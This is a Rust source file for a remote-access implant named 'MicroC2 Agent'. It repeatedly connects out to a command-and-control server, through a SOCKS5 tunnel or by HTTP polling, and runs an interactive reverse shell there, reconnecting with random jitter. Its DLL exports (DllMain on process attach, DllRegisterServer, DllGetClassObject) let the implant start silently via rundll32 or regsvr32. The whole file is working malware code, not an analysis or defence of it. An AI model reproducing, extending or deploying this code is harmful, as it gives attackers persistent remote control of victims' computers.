extern crate tokio;
extern crate hyper;
extern crate chrono;

mod file_handling;
mod commands;
mod config;
mod networking;

use commands::command_shell::{run_shell, run_shell_over_socks};
use config::AgentConfig;
use tokio_socks::tcp::Socks5Stream;
use std::env;
use std::time::Duration;
use std::net::SocketAddr;

#[cfg(feature = "dll")]
use std::os::raw::c_int;

// Main entry point for standalone executable
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("[STARTUP] MicroC2 Agent starting...");
    
    // Load configuration or use command line args
    let config = AgentConfig::load()?;
    let server_addr = env::args()
        .nth(1)
        .unwrap_or_else(|| config.get_server_url());
    
    // Use payload ID from config as agent ID
    let agent_id = config.payload_id.clone();
    println!("[INFO] Agent ID: {}", agent_id);

    // Choose communication protocol
    if config.protocol == "socks5" && config.socks5_enabled {
        // SOCKS5 reverse shell loop
        loop {
            println!("[NETWORK] Establishing SOCKS5 tunnel to C2 via 127.0.0.1:{}...", config.socks5_port);
            let proxy_addr: SocketAddr = format!("127.0.0.1:{}", config.socks5_port).parse()?;
            let stream = Socks5Stream::connect(proxy_addr, server_addr.clone())
                .await?
                .into_inner();
            println!("[SOCKS5] Tunnel to C2 ({}) established", server_addr);
            // Run interactive shell over the SOCKS5 tunnel
            if let Err(e) = run_shell_over_socks(stream, &agent_id).await {
                println!("[ERROR] Shell error: {}. Retrying...", e);
            } else {
                println!("[INFO] Shell session ended");
            }
            // Jittered reconnect
            let sleep_time = config.sleep_interval + (rand::random::<u64>() % config.jitter);
            tokio::time::sleep(Duration::from_secs(sleep_time)).await;
            println!("[RETRY] Attempting to reconnect tunnel...");
        }
    } else {
        // HTTP-polling shell loop
        loop {
            println!("[NETWORK] Attempting connection to C2: {}", server_addr);
            if let Err(e) = run_shell(&server_addr, &agent_id).await {
                println!("[ERROR] Shell error: {}. Retrying...", e);
            } else {
                println!("[INFO] Shell session ended");
            }
            let sleep_time = config.sleep_interval + (rand::random::<u64>() % config.jitter);
            tokio::time::sleep(Duration::from_secs(sleep_time)).await;
            println!("[RETRY] Attempting to reconnect...");
        }
    }
}

// Shared agent code used by both executable and DLL
async fn run_agent() -> Result<(), Box<dyn std::error::Error>> {
    println!("[STARTUP] MicroC2 Agent starting...");
    
    // Load configuration
    let config = AgentConfig::load().map_err(|e| {
        eprintln!("[FATAL] Failed to load configuration: {}", e);
        eprintln!("[FATAL] Agent requires valid server_url and payload_id in configuration");
        e
    })?;
    
    // Use payload_id from config
    let agent_id = config.payload_id.clone();
    println!("[INFO] Agent ID: {}", agent_id);
    
    // Shared DLL entrypoint uses same logic
    let server_addr = config.get_server_url();
    loop {
        println!("[NETWORK] Establishing SOCKS5 tunnel to C2 via 127.0.0.1:1080...");
        let proxy_addr: SocketAddr = "127.0.0.1:1080".parse()?;
        let target = format!("{}", server_addr);
        let stream = Socks5Stream::connect(proxy_addr, target)
            .await?
            .into_inner();
        println!("[SOCKS5] Tunnel to C2 ({}) established", server_addr);

        // Run interactive shell over the SOCKS5 tunnel
        match run_shell_over_socks(stream, &agent_id).await {
            Ok(()) => println!("[INFO] Shell session ended"),
            Err(e) => println!("[ERROR] Shell error: {}. Retrying...", e),
        }

        // Jittered reconnect
        let sleep_time = config.sleep_interval + (rand::random::<u64>() % config.jitter);
        tokio::time::sleep(Duration::from_secs(sleep_time)).await;
        println!("[RETRY] Attempting to reconnect tunnel...");
    }
}

// === DLL Exports ===
// Only compile these when the "dll" feature is enabled

#[cfg(feature = "dll")]
#[no_mangle]
#[allow(non_snake_case)]
pub extern "C" fn DllMain(_hinst: usize, reason: u32, _reserved: usize) -> c_int {
    // DLL_PROCESS_ATTACH = 1
    if reason == 1 {
        // Start a background thread to run the agent, handling runtime creation errors
        match tokio::runtime::Runtime::new() {
            Ok(rt) => {
                std::thread::spawn(move || {
                    rt.block_on(async {
                        let _ = run_agent().await;
                    });
                });
            }
            Err(e) => {
                eprintln!("[ERROR] DllMain: failed to initialize Tokio runtime: {}", e);
                return 0;
            }
        }
    }
    1 // Return true
}

#[cfg(feature = "dll")]
#[no_mangle]
#[allow(non_snake_case)]
pub extern "C" fn RunAgent() -> c_int {
    // Create a tokio runtime
    match tokio::runtime::Runtime::new() {
        Ok(rt) => {
            // Run the agent in the runtime
            rt.block_on(async {
                match run_agent().await {
                    Ok(_) => (),
                    Err(e) => eprintln!("[FATAL] Agent error: {}", e)
                }
            });
            1 // Success (even if there was an error, we don't want to crash)
        },
        Err(_) => 0 // Runtime creation failure
    }
}

// Additional DLL exports that Windows might expect
#[cfg(feature = "dll")]
#[no_mangle]
pub extern "C" fn DllRegisterServer() -> c_int {
    RunAgent()
}

#[cfg(feature = "dll")]
#[no_mangle]
pub extern "C" fn DllUnregisterServer() -> c_int {
    1 // Success
}

// This allows rundll32.exe to call this export directly
#[cfg(feature = "dll")]
#[no_mangle]
#[allow(non_snake_case)]
pub extern "C" fn DllGetClassObject() -> c_int {
    RunAgent()
}
